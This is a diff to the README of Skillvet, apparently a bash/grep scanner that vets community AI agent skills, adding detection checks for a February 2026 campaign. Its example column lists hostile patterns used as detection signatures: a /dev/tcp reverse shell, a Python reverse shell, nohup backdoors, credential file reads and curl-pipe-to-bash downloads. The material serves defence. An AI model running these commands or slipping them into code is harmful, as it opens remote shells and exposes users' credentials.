@@ -3,13 +3,13 @@ name: skillvet
 description: Security scanner for ClawHub/community skills — detects malware, credential theft, exfiltration, prompt injection, obfuscation, homograph attacks, ANSI injection, campaign-specific attack patterns, and more before you install. Use when installing skills from ClawHub or any public marketplace, reviewing third-party agent skills for safety, or vetting untrusted code before giving it to your AI agent. Triggers: install skill, audit skill, check skill, vet skill, skill security, safe install, is this skill safe.
 compatibility: Requires bash, grep, find, and file. Optional: perl (fallback for grep -P on macOS). Works on Linux and macOS.
 metadata:
-  version: "3.0.0"
+  version: "3.1.0"
   author: nathangit
 ---
 
 # Skillvet
 
-Security scanner for agent skills. 37 critical checks, 8 warning checks. No dependencies — just bash and grep. Includes Tirith-inspired detection patterns, campaign signatures from [Koi Security research](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting), and [1Password blog](https://1password.com/blog/from-magic-to-malware-how-openclaws-agent-skills-become-an-attack-surface) ClickFix patterns.
+Security scanner for agent skills. 48 critical checks, 8 warning checks. No dependencies — just bash and grep. Includes Tirith-inspired detection patterns, campaign signatures from [Koi Security](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting), [Bitdefender](https://businessinsights.bitdefender.com/technical-advisory-openclaw-exploitation-enterprise-networks), [Snyk](https://snyk.io/articles/clawdhub-malicious-campaign-ai-agent-skills/), and [1Password](https://1password.com/blog/from-magic-to-malware-how-openclaws-agent-skills-become-an-attack-surface) ClickFix patterns.
 
 ## Usage
 
@@ -172,6 +172,24 @@ Inspired by [1Password research](https://1password.com/blog/from-magic-to-malwar
 | 35 | ClickFix download+execute chain | `curl -o /tmp/x && chmod +x && ./x`, `open -a` with downloads |
 | 36 | Suspicious package sources | `pip install git+https://...`, npm from non-official registries |
 | 37 | Staged installer pattern | Fake dependency names like `openclaw-core`, `some-lib` |
+
+### Feb 2026 Campaign Checks (38-48)
+
+New patterns from [Bitdefender](https://businessinsights.bitdefender.com/technical-advisory-openclaw-exploitation-enterprise-networks), [Snyk](https://snyk.io/articles/clawdhub-malicious-campaign-ai-agent-skills/), and ongoing ClawHavoc campaign research.
+
+| # | Check | Example |
+|---|-------|---------|
+| 38 | Fake OS update social engineering | "Apple Software Update required for compatibility" |
+| 39 | Known malicious ClawHub actors | zaycv, Ddoy233, Sakaen736jih, Hightower6eu references |
+| 40 | Bash /dev/tcp reverse shell | `bash -i >/dev/tcp/IP/PORT 0>&1` (AuthTool pattern) |
+| 41 | Nohup backdoor | `nohup bash -c '...' >/dev/null` with network commands |
+| 42 | Python reverse shell | `socket.connect` + `dup2`, `pty.spawn('/bin/bash')` |
+| 43 | Terminal output disguise | Decoy "downloading..." message before malicious payload |
+| 44 | Credential file access | Direct reads of `.env`, `.pem`, `.aws/credentials` |
+| 45 | TMPDIR payload staging | AMOS pattern: drop malware to `$TMPDIR` then execute |
+| 46 | GitHub raw content execution | `curl raw.githubusercontent.com/... \| bash` |
+| 47 | Echo-encoded payloads | Long base64 strings echoed and piped to decoders |
+| 48 | Typosquat skill names | `clawdhub-helper`, `openclaw-cli`, `skillvet1` |
 
 ## Warning Checks (flagged for review)
 
